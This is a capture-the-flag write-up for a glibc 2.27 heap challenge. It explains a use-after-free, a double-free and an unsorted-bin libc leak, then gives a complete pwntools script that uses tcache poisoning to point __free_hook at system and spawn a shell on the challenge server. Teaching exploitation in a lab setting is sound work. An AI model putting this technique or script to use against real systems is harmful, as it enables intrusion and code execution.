
## Challenge's Description

`Professor Oak has developed a new prototype of the Pokédex, still in its testing phase. You can add your favorite Pokémon to it, but the code seems a bit unpredictable... Some say it might contain hidden features that even the Professor doesn't know about!`

`nc pwn.jeanne-hack-ctf.org 9002`

**category:** `pwn`<br>
**difficulty**: `medium`<br>
**libc version:** `2.27`

## First look

We are given a classic CTF-style binary that provides a menu-based interface, allowing us to:

- Catch Pokémon (allocate heap memory)
- Edit Pokémon data
- Release Pokémon (free memory)
- Inspect Pokémon data

Internally, each Pokémon entry corresponds to a dynamically allocated heap chunk. The program stores up to 8 entries, each containing a pointer and its size.
At first glance, this looks like a typical heap manager challenge, suggesting that the solution will likely involve heap exploitation.

## Local Setup

The challenge provided a custom `libc` and dynamic loader.  
To ensure that the binary runs locally under the same environment as the remote service, we used **pwninit** to patch the executable with the given `libc` and `ld`.

`$ pwninit`

## Security Protections

We then checked the enabled mitigations on the patched binary:

```sh
checksec pokedex_patched
[*] '/home/vein/sec/jeanne_hack_ctf-2026/pwn-pokedex/pokedex_patched'
    Arch:       amd64-64-little
    RELRO:      Full RELRO
    Stack:      Canary found
    NX:         NX enabled
    PIE:        PIE enabled
    RUNPATH:    b'.'
    Stripped:   No
```
Because of these mitigations, classical stack-based exploitation is not feasible.  
Therefore, the intended solution focuses on **heap exploitation and libc hijacking**.


## Vulnerability Analysis

The Pokédex implements a simple heap manager but contains multiple memory management bugs.

### Unrestricted Allocation Size

The program allows allocations up to 1280 bytes:
```c
if (!v1 || v1 > 1280) error;
```

This lets us allocate both:
- Small chunks (tcache)
- Large chunks (unsorted bin)
This is useful for controlled heap grooming and leaking libc.


### Use-After-Free & Double-Free

In `release_pokemon()`, freed pointers are not cleared:
```c
free(ptr);
```

The slot remains valid, allowing:

- Editing freed chunks
- Inspecting freed chunks
- Freeing the same chunk again

This creates a **use-after-free** and potential **double-free** vulnerability.


### Information Leak

`inspect_pokemon()` prints raw memory from heap chunks.

When inspecting freed large chunks, we can leak `main_arena` pointers from the unsorted bin, giving a reliable libc leak.


### Summary

These bugs give us:

| Bug         | Primitive               |
| ----------- | ----------------------- |
| UAF         | Write into freed chunks |
| Double-free | Tcache control          |
| Inspect     | Libc leak               |

Since glibc 2.27 has no safe-linking, this enables tcache poisoning.


## Exploit Walkthrough

The exploit has two stages:

1. Leak libc using an unsorted bin chunk
2. Overwrite `__free_hook` using tcache poisoning


### Stage 1 — Libc Leak

We allocate and free a large chunk:
```python
malloc(0, 1280, 'A') 
free(0)
insp3ct(0)
```
This leaks a `main_arena` pointer from the unsorted bin.

We compute libc base:
```python
libc.address = leak - 0x3ebca0
```


### Stage 2 — Tcache Poisoning

We prepare a tcache chunk:
```python
malloc(2, 0x60, 'B')
free(2)
```

Using UAF, we overwrite its forward pointer:
```python
edit(2, 8, p64(libc.sym.__free_hook))
```


### Stage 3 — Code Execution

We allocate twice:
```python
malloc(3, 0x60, '/bin/sh\x00')
malloc(4, 0x60, p64(libc.sym.system))
```
This overwrites:
```python
__free_hook = system
```
Freeing `/bin/sh` triggers:
```python
free(3)
```
Result:
```python
system("/bin/sh")
```
We then read the flag.
### POC

```sh
┌──(vein㉿DESKTOP-9OL88GK)-[~/sec/jeanne_hack_ctf-2026/pwn-pokedex]
└─$ ./exploit.py REMOTE
[+] Opening connection to pwn.jeanne-hack-ctf.org on port 9002: Done
/home/vein/sec/jeanne_hack_ctf-2026/pwn-pokedex/./exploit.py:26: BytesWarning: Text is not bytes; assuming ASCII, no guarantees. See https://docs.pwntools.com/#bytes
  ru      = lambda delims, drop=True  :p.recvuntil(delims, drop, timeout=context.timeout)
[*] main arena: 0x7fac3a125ca0
[*] libc base : 0x7fac39d3a000
[*] Switching to interactive mode
JDHACK{90TTa_CATCH_7H3M_41L!}
$
```

## Conclusion

This challenge can be solved by combining:

- Unsorted bin leak
- Use-after-free
- Tcache poisoning
- `__free_hook` overwrite

Using these primitives, we achieve reliable code execution on glibc 2.27.


## Full Exploit Script

```python
#!/usr/bin/env python3

from pwn import *

elf = context.binary = ELF('./pokedex_patched', checksec=False)
libc = ELF('./libc.so.6', checksec=False)
context.log_level = 'debug'
context.terminal = ['tmux', 'split', '-h']

gdbscript = '''

    continue

'''

def start():
    if args.GDB:
        return gdb.debug(elf.path, gdbscript=gdbscript)
    if args.REMOTE:
        return remote('pwn.jeanne-hack-ctf.org', 9002)
    else:
        return process(elf.path)

convert = lambda x                  :x if type(x)==bytes else str(x).encode()
s       = lambda data               :p.send(convert(data))
sa      = lambda delim, data        :p.sendafter(convert(delim), convert(data), timeout=context.timeout)
sl      = lambda data               :p.sendline(convert(data))
sla     = lambda delim,data         :p.sendlineafter(convert(delim), convert(data), timeout=context.timeout)
ru      = lambda delims, drop=True  :p.recvuntil(delims, drop, timeout=context.timeout)
r       = lambda n                  :p.recv(n)
rl      = lambda                    :p.recvline()
  
def malloc(idx, size, data):
    sla('> ', '1')
    sla(': ', idx)
    sla(': ', size)
    sla(': ', data)

def edit(idx, size, data):
    sla('> ', '2')
    sla(': ', idx)
    sla(': ', size)
    sla(': ', data)  

def free(idx):
    sla('> ', '3')
    sla(': ', idx)

def insp3ct(idx):
    sla('> ', '4')
    sla(': ', idx)

p = start()

malloc(0, 1280, 'trash-0')
malloc(1, 1280, 'trash-1')
  
free(0)

insp3ct(0)
ru(' 0: ')
MAIN_ARENA = int(rl().strip(), 16)
libc.address = MAIN_ARENA - 0x3ebca0
info('main arena: ' + hex(MAIN_ARENA))
info('libc base : ' + hex(libc.address))
  
malloc(2, 0x60, 'trash-2')
free(2)
edit(2, 8, p64(libc.sym.__free_hook))
 
malloc(3, 0x60, '/bin/sh\x00')
malloc(4, 0x60, p64(libc.sym.system))
  
free(3)
sl('cat flag.txt')

p.interactive()
```
